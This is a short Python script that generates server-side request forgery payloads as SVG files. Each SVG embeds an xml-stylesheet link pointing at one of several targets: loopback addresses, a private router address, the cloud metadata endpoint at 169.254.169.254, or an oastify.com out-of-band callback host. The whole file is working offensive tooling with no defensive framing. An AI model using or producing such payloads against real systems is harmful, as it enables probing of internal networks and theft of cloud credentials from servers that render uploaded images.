import os

# List of target URLs for SSRF
targets = [
    "http://127.0.0.1:80",
    "http://localhost:8000",
    "http://169.254.169.254/latest/meta-data/",
    "http://192.168.0.1:80",
    "http://615w7ytgwtschqekvctbbwb0yr4is9gy.oastify.com",
]

# SVG body template
svg_body = '''<?xml version="1.0" standalone="yes"?>
<?xml-stylesheet type="text/css" href="{url}"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="red"/>
</svg>'''

# Output folder
os.makedirs("payloads", exist_ok=True)

# Write a file per target
for i, url in enumerate(targets):
    payload = svg_body.format(url=url)
    filename = f"payloads/ssrf_svg_{i+1}.svg"
    with open(filename, "w") as f:
        f.write(payload)
    print(f"[+] Saved: {filename} -> {url}")
